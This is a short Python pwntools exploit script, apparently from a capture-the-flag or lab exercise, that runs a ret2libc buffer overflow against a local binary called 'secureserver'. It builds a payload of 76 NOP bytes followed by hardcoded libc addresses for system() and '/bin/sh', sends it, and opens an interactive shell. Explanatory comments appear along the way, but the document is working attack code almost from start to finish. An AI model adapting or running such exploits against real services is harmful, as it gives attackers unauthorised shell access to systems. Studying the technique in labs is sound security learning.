#!/usr/bin/env python3

from pwn import *

exe = ('./secureserver')

elf = context.binary = ELF(exe,checksec=False)

context.log_level = 'debug'

io = process(exe)

padding = 76

lib_c_base = 0xf7c00000
system = lib_c_base + 0x0004c880
binsh = lib_c_base + 0x1b5fc8

info('system: %#x',system) # print absolute addrss of system function
info('binsh: %#x',binsh) # print absolute address of /bin/sh string

#suppose the above address were leaked, we can then go in gdb and confirm with
# x addressWegot

payload = flat(
    asm('nop')*padding, #Padding upto EIP
    system, #Address of system function in libc library
    0x0, #when we enter a new function, first thing we do is enter the return address so that we can return to previous function after executing our current one
    binsh, # Address of /bin/sh in libc, 32 bit will take this parameter of the stack and 64 bit will take it out of rdi and rsi
)

write("payload",payload) # write our payload to a file called payload

io.sendlineafter(b':\n',payload)

io.interactive()

#print(io.recvall().decode('latin-1'))
